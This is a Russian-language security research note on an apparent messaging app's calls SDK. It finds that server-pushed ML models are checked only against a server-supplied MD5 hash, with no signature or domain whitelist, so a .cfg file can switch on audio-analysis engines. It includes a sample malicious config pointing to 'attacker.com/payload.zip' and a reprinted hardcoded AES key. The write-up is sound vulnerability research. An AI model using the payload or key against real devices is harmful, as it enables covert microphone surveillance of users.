---
tags: [critical, ml-pipeline, server-control, model-download, externcalls-sdk, tflite, circular-trust, no-signature, no-whitelist]
status: verified
severity: high
sources:
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/MLFeaturesManagerImpl.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/MLFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/KwsFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/delegate/NSFeatureDelegate.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/MLFeatureConfigProviderBase.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/ml/config/MLFeatureConfig.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/net/DownloadService.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/net/FileValidationConfig.java
  - work/jadx_base/sources/ru/ok/android/externcalls/sdk/api/RemoteSettings.java
  - work/jadx_base/sources/org/webrtc/PeerConnectionFactory.java
  - work/apktool_arm64/lib/arm64-v8a/libEnhancementLibShared.so
related:
  - "[[16-server-pushed-ml-models-in-calls]]"
  - "[[28-vk-enh-decrypt-key]]"
  - "[[532-speaker-recognition-profanity]]"
  - "[[547-webview-ssl-bypass-deepfake-tflite-key]]"
  - "[[545-three-audio-interception-channels]]"
---

# 548. Server-pushed ML pipeline: circular MD5 trust + 20 native engines, активируемых через .cfg

## TL;DR

Архитектура загрузки ML-моделей в звонках спроектирована так, что **сервер полностью контролирует**, какая модель будет загружена и какой engine из 20+ типов в `libEnhancementLibShared.so` будет создан. Защиты нет:

- **Нет криптографической подписи** моделей — только MD5-checksum, и **сам сервер задаёт ожидаемый hash** (circular trust)
- **Нет whitelist доменов** для URL — сервер может указать любой `https://attacker.com/malicious.zip`
- **Нет certificate pinning** для download URL
- **Нет проверки типа engine** в `.cfg` — Java-слой не валидирует, какой именно engine из Registry будет создан
- В **26.16.0 KWS удалён из Java**, но **остался в native** — `vk::enh::KWS` доступен через .cfg через NS-канал

Topic 16 описывал факт «модели качаются с сервера». Этот topic показывает, **как именно** эта архитектура устроена и что конкретно может сделать злоумышленник с серверным доступом или MITM на RemoteSettings API.

## 1. Pipeline

```
SERVER (RemoteSettings API)
    │ JSON config: {"url": "...", "cs": "<md5>", "use": true}
    ▼
JAVA: MLFeaturesManagerImpl.start()
    │ для каждого delegate (KwsFeatureDelegate / NSFeatureDelegate)
    ▼
fetchConfig() → RemoteSettings.get("android.mlfeatures.{ws_0|ns_1}")
    │
    ▼
parseConfig(json) → MLFeatureConfig{url, checksum, enabled}
    │ url валидируется ТОЛЬКО Patterns.WEB_URL regex (стандартный Android)
    ▼
DownloadService.download(url, dest, FileValidationConfig)
    │ HttpURLConnection, валидация = MD5(downloaded) == config.cs
    ▼
unzipModel() → ml_features/{ws|ns}/ → .tflite + .cfg
    │ Java НЕ читает содержимое .cfg
    ▼
PeerConnectionFactory.setPreprocessorParams / setKeywordSpotterParams
    │ JNI: nativeSetPreprocessorParams(factory, enabled, kind, path, ...)
    ▼
NATIVE (libEnhancementLibShared.so)
    │ читает .cfg → создаёт engine из Registry
    │ читает .tflite → vk::enh::decrypt(AES-128 hardcoded key)
    │ TfLiteInterpreterWrapper.invoke()
    ▼
Pipeline thread: на raw PCM микрофона ДО Opus encoding
```

## 2. Конфиг от сервера — формат

`MLFeatureConfigProviderBase.parseConfig(json)`:

```java
JSONObject obj = new JSONObject(json);
String url = obj.optString("url", "");
String cs  = obj.optString("cs",  "");      // MD5 hex
boolean use = obj.optBoolean("use", false);
return new MLFeatureConfig(url, cs, use);
```

Серверные ключи RemoteSettings:
- `android.mlfeatures.ws_0` — KWS модель (26.15.3; **удалена из Java** в 26.16.0)
- `android.mlfeatures.ns_1` — NS (noise suppression) модель
- `android.wordspotter.config` — параметры поведения KWS (`turnOffInMs`)

**Все три ключа возвращают строку, серверно-задаваемую через RemoteSettings API.** Hardcoded URL в клиенте нет.

## 3. Circular MD5 trust — главная архитектурная слабость

```java
// DownloadService.Impl.download$lambda$3()
// 1. URL check — единственная проверка URL
if (!Patterns.WEB_URL.matcher(url).matches()) {
    throw new IllegalArgumentException("invalid url");
}

// 2. Download
HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
// ... read into file ...

// 3. MD5 check — против ожидаемого hash из ТОГО ЖЕ конфига
String actual = computeMD5(file);
if (!actual.equalsIgnoreCase(config.expectedChecksum)) {
    throw new ChecksumMismatchException();
}
```

**Логическая проблема:** `expectedChecksum` приходит из той же серверной строки, что и `url`. Если злоумышленник контролирует RemoteSettings ответ — он указывает свой `url` и свой `cs = md5(своего malicious.zip)`. Проверка пройдёт.

**Это не защита от подмены модели**, а только защита от случайной коррупции при скачивании.

Криптографической подписи (Ed25519, RSA, GPG) нет ни в Java-слое, ни в native (verified через `findings/native/libEnhancementLibShared.exports.txt` — нет вызовов `EVP_DigestVerify*`, нет публичного ключа в `.rodata`).

## 4. Native Registry — 20+ engine типов через .cfg

`libEnhancementLibShared.so` содержит `vk::enh::Registry<std::string, Factory>`, в котором зарегистрированы фабрики:

| Engine name | Назначение | Риск |
|---|---|---|
| `Pipeline` | Основной audio preprocessing | low (контейнер) |
| `KWS` | Keyword spotting (wake-words, ключевые фразы) | **high** |
| `ASR` | Speech recognition (on-device) | **high** |
| `AudioClassifier` | Классификация по моделе (.tflite определяет что ловит) | **high** |
| `DiarizationEngine` | Кто говорит (speaker diarization) | medium |
| `SpeakerRecognitionEngine` | Идентификация голоса (1:N) | **high** |
| `SpeakerRecognitionVerifier` | Верификация голоса (1:1) | **high** |
| `Wav2LipV1/V3/V4` | Lip-sync deepfake (см. 547) | **high** |
| `Animoji` | Face animation | low |
| `SuperResolution` | Улучшение видео | low |
| `EnhancementAlgorithm` | Generic audio enhancement | medium |
| `ForcedAligner` | Alignment текста и аудио (для ASR) | medium |
| `Profanity` | Детекция нецензурной лексики | medium |
| `AudioFilter`/`AudioMixer`/`AudioDelayBuffer` | DSP блоки | low |
| `AEC`/`AGC`/`Codec`/`Resampler` | Стандартные аудио-блоки | low |
| `Nnet` | Generic neural network wrapper | medium |
| `Vfi` | Video frame interpolation | low |
| `Effect` | Generic effect | low |
| `Punct` | Punctuation для ASR | low |

**Ключевое:** Java-слой передаёт в native только **путь к директории**, в которой лежит `.tflite` + `.cfg`. Какой engine создать из Registry — определяется **содержимым `.cfg`**. Java его не парсит и не валидирует.

## 5. Сценарий злоупотребления

### Что нужно злоумышленнику:
- Контроль над сервером MAX (или MITM на RemoteSettings API — учитывая 537/543 это в рамках возможностей)

### Что он может сделать:

1. Через `RemoteSettings` для конкретного `userId` подменить ответ на ключ `android.mlfeatures.ns_1`:
   ```json
   {"url":"https://attacker.com/payload.zip", "cs":"<md5 of payload.zip>", "use":true}
   ```
2. Клиент скачает `.zip`, проверит MD5 (совпадает — атакующий сам его вычислил), распакует.
3. В `.cfg` злоумышленник может указать любой engine из Registry. Например:
   - `KWS` с custom-словарём ключевых фраз — тихий audio spotter, который сообщает на сервер срабатывания
   - `SpeakerRecognitionEngine` с эмбеддингом конкретного голоса — точечная идентификация speaker'а
   - `AudioClassifier` с custom-меткой — детекция произвольного звукового события
4. Engine начинает работать в `nativeSetPreprocessorParams` pipeline — на **raw PCM микрофона до Opus encoding**.
5. Результаты возвращаются через callback `NativeDoubleArrayConsumer` → Java → штатные analytics endpoints.

### Что engine не может (ограничения):

- TFLite interpreter — не arbitrary code execution (ограниченный набор ops)
- Нет direct network access из TFLite
- Модель не может exfiltrate raw audio за пределы устройства напрямую — она возвращает только агрегированный результат (вектор/класс/score)

### Но через callback:

Для KWS callback `bad_call_detected_by_audio_spotter(confidence)` уходит на сервер — это уже задокументированное поведение в 26.15.3. Аналогичные callbacks для других engine'ов могут быть инжектированы через ML pipeline.

## 6. KWS в 26.16.0: удалён из Java, остался в native

В 26.16.0:
- `KwsFeatureDelegate` — удалён из smali
- `KwsFeatureConfigProvider` — удалён
- `MLFeatureType.WS` — удалён из enum (только `NS` остался)
- `MLFeaturesManagerImpl` — упрощён до одного delegate (NS)

Но в `libEnhancementLibShared.so`:
- `vk::enh::KWS` — **на месте**
- `vk::enh::KwsBufferizator<float/int/short>` — **на месте**
- Registry `KWS` factory — **зарегистрирован**

**Следствие:** если NS-канал доставит `.cfg` с KWS engine — native его создаст. Java не валидирует тип engine. Это **тихий путь возвращения** KWS через NS-канал без обновления APK и без переустановки клиента.

Это спекуляция в части использования — но техническая возможность подтверждена кодом.

## 7. Что НЕ проверяется (полный список)

| Проверка | Статус |
|---|---|
| Whitelist доменов URL | ❌ нет |
| Регекс схемы (только https) | ❌ нет (`Patterns.WEB_URL` принимает http) |
| Certificate pinning | ❌ нет |
| Криптографическая подпись модели | ❌ нет |
| Проверка содержимого `.tflite` | ❌ нет |
| Проверка типа engine в `.cfg` | ❌ нет |
| Sandbox для TFLite inference | ❌ нет (тот же процесс) |
| Минимальный размер файла | ✓ default 1 byte |
| MD5 проверка | ✓ но против server-supplied hash |
| Версия модели | ✓ против сохранённой клиентом version-string |

## 8. Связь с 547 (hardcoded AES key)

547 описал hardcoded AES-128 ключ `6f 8c c4 b7 19 d4 0d 16 d1 fc b9 ba bb c4 7d 7e` для расшифровки `.tflite` в native. Этот topic подтверждает поток: Java скачивает зашифрованный `.tflite`, передаёт путь в native, native расшифровывает hardcoded ключом и грузит в TFLite interpreter.

Поскольку ключ известен любому реверсеру — это **не защита от подмены**, а только obfuscation. Серверу для подмены модели нужно зашифровать `.tflite` тем же hardcoded ключом — что тривиально.

## 9. Файлы — ключевые точки

- `MLFeatureConfigProviderBase.java:42-46` — parseConfig: `url`, `cs`, `use`
- `MLFeatureDelegate.java:downloadModel()` — download + MD5 verify
- `DownloadService.java:Impl.download$lambda$3()` — `Patterns.WEB_URL` + MD5
- `MLFeaturesManagerImpl.java:start()` — orchestration
- `PeerConnectionFactory.java:579-588` — JNI calls
- `findings/native/libEnhancementLibShared.exports.txt` — Registry engines

## 10. Риск-оценка

**HIGH (не CRITICAL)**

Почему HIGH:
- Сервер может заменить ML-модель без обновления APK
- Нет криптографической подписи (circular MD5 trust)
- Нет whitelist URL
- 20+ engine типов доступно через `.cfg`
- Engine работает на raw PCM микрофона
- KWS остаётся в native в 26.16.0

Почему не CRITICAL:
- TFLite не arbitrary code execution
- Exfiltration ограничена возвратом callback (агрегированный результат)
- Реальная эксплуатация требует server-side доступа

## 11. Статус в 26.16.0

- KWS удалён из Java (KwsFeatureDelegate, MLFeatureType.WS)
- NS pipeline без изменений
- Hardcoded AES key без изменений
- Native Registry без изменений (включая KWS engine)
- Серверные RemoteSettings ключи без изменений (только для NS)
